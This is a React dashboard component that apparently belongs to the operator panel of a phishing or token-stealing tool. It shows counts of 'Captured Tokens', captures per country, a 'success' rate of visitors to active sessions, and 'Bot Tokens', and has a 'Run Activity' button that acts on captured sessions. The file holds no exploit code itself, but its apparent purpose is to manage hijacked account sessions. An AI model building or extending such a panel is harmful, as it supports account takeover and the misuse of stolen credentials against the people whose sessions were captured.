import { useEffect, useState } from 'react'
import { Key, Users, TrendingUp, Bot, Plus } from 'lucide-react'
import StatCard from '../components/StatCard'
import CountryChart from '../components/CountryChart'
import CapturedSessionsTable from '../components/CapturedSessionsTable'
import RunActivityModal from '../components/RunActivityModal'
import { sessionsApi, tokensApi } from '../lib/api'

export default function Dashboard() {
  const [rows, setRows] = useState([])
  const [tokens, setTokens] = useState([])
  const [runOpen, setRunOpen] = useState(false)
  const [loading, setLoading] = useState(true)

  useEffect(() => { refresh() }, [])

  const remove = async (id) => {
    try {
      await sessionsApi.remove(id)
      setRows((arr) => arr.filter((r) => r.id !== id))
    } catch {}
  }

  const refresh = async () => {
    setLoading(true)
    try {
      const [sessionRows, tokenRows] = await Promise.all([
        sessionsApi.list().catch(() => []),
        tokensApi.list().catch(() => [])
      ])
      setRows(Array.isArray(sessionRows) ? sessionRows : [])
      setTokens(Array.isArray(tokenRows) ? tokenRows : [])
    } finally {
      setLoading(false)
    }
  }

  const country = Object.entries(
    (rows || []).reduce((acc, row) => {
      const key = row.country || 'UNK'
      acc[key] = (acc[key] || 0) + 1
      return acc
    }, {})
  ).map(([c, captures]) => ({ country: c, captures }))

  const activeCount = rows.filter((r) => r.status === 'Active').length
  const total = rows.length

  const stats = {
    captured: activeCount,
    visitors: total,
    success: total ? `${Math.round((activeCount / total) * 100)}%` : '0%',
    bots: (tokens || []).filter(
      (t) => t.account_type && String(t.account_type).toLowerCase().includes('bot')
    ).length
  }

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={Key} label="Captured Tokens" value={stats.captured} accent="purple" change={12} />
        <StatCard icon={Users} label="Sessions" value={stats.visitors} accent="accent" change={8} />
        <StatCard icon={TrendingUp} label="Active Rate" value={stats.success} accent="success" change={3} />
        <StatCard icon={Bot} label="Bot Tokens" value={stats.bots} accent="danger" change={-2} />
      </div>
      <CountryChart data={country} />
      <div>
        <div className="flex items-center justify-between mb-3">
          <h2 className="text-lg font-semibold text-white">Active Sessions</h2>
          <button onClick={() => setRunOpen(true)}
            className="px-4 py-2 rounded-xl bg-gradient-to-r from-accent to-purple text-white text-sm font-medium shadow-glow flex items-center gap-2 hover:brightness-110">
            <Plus size={16} />Run Activity
          </button>
        </div>
        <CapturedSessionsTable rows={rows} onRefresh={refresh} onDelete={remove} loading={loading} />
      </div>
      <RunActivityModal open={runOpen} onClose={() => setRunOpen(false)} />
    </div>
  )
}